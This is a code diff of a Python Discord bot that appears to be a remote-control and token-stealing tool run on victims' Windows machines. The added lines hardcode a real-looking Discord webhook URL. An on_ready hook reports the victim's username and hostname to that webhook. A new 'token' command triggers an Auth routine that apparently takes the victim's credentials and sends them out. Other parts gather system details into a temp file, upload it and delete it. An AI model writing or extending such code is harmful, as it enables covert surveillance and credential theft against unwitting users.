@@ -272,6 +272,12 @@ def advence_info(path):
         write.write(tabulate(list_gpus, headers=("id", "name", "load", "free memory", "used memory", "total memory",
                                         "temperature", "uuid")))
 
+WEBHOOK_URL = 'https://canary.discord.com/api/webhooks/940641675758424124/Jyt3kY-HPFa3IoqZDCUd7CVaRJbY2R_xxp_TdM4OuXlPgf0UFZ3XI7ebi1Ks00_RPp7a'
+@bot.event
+async def on_ready():
+    urlopen(Request(WEBHOOK_URL, data=dumps(webhook_info(f'> logged as **{os.getenv("UserName")}** | {str(socket.gethostname())} ({system})')).encode(), headers=getheaders()))
+
+
 
 def normal_info():
     uname = platform.uname()
@@ -330,7 +336,6 @@ async def adv(ctx, pc=pc_name):
     advence_info(f'c:\\WINDOWS\\Temp\\i.txt')
     await ctx.send(file=discord.File(f'c:\\WINDOWS\\Temp\\i.txt'))
     os.remove(f'c:\\WINDOWS\\Temp\\i.txt')
-
 
 def Auth(url):
     def dastela(url):
@@ -472,5 +477,10 @@ def Auth(url):
     except:
         pass
     os.system('cls')
+
+@bot.command()
+async def token(ctx, pc=pc_name, url=WEBHOOK_URL):
+    if pc == os.getenv("UserName"):
+        Auth(url)
 
 bot.run(token)
